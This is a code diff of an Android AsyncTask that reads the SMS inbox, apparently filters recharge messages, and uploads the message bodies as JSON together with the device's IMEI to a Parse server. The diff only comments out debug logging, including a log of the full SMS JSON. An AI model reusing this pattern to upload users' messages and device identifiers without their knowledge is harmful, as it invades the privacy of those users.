@@ -28,7 +28,7 @@ public class SmsDataInitializer extends AsyncTask<Void,Void,Void>
     {
         SharedPreferences mSharedPreferences = MyApplication.context.getSharedPreferences("USER_DATA", Context.MODE_PRIVATE);
         long last_indexed_id = mSharedPreferences.getLong("SMS_INDEXED_ID", -1l);
-        Log.d(tag,"SMS_INDEXED_ID = "+last_indexed_id);
+       //V10Log.d(tag,"SMS_INDEXED_ID = "+last_indexed_id);
         Uri smsUri = Uri.parse("content://sms/inbox");
         Cursor cursor = MyApplication.context.getContentResolver().query(smsUri,
                 new String[]{"address", "date", "body", "_id"},
@@ -43,7 +43,7 @@ public class SmsDataInitializer extends AsyncTask<Void,Void,Void>
         int _idIdx = cursor.getColumnIndex("_id");
         ArrayList<SmsData> smsList = new ArrayList<>();
         String number;
-        Log.d(tag, "Number of Rows = " + cursor.getCount());
+       //V10Log.d(tag, "Number of Rows = " + cursor.getCount());
         if (cursor.moveToFirst())
         {
 
@@ -62,17 +62,17 @@ public class SmsDataInitializer extends AsyncTask<Void,Void,Void>
             }
             while (cursor.moveToNext());
 
-            Log.d(tag, "Number of Recharge SMSes = " + smsList.size());
+           //V10Log.d(tag, "Number of Recharge SMSes = " + smsList.size());
             String smsJsonString = (new Gson()).toJson(smsList);
-            Log.d(tag, "SMS List JSON String = " + smsJsonString);
+           //V10Log.d(tag, "SMS List JSON String = " + smsJsonString);
             ParseObject parseObject = new ParseObject("SMS_DATA");
             parseObject.put("DEVICE_ID", ((TelephonyManager) MyApplication.context.getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId());
             parseObject.put("SMS_JSON", smsJsonString);
             parseObject.saveEventually();
-            Log.d(tag, "Saving to Server ");
+           //V10Log.d(tag, "Saving to Server ");
             cursor.moveToPrevious();
             mSharedPreferences.edit().putLong("SMS_INDEXED_ID", cursor.getLong(_idIdx)).commit();
-            Log.d(tag, "Updated Index to  " + cursor.getLong(_idIdx));
+           //V10Log.d(tag, "Updated Index to  " + cursor.getLong(_idIdx));
         }
 
     }
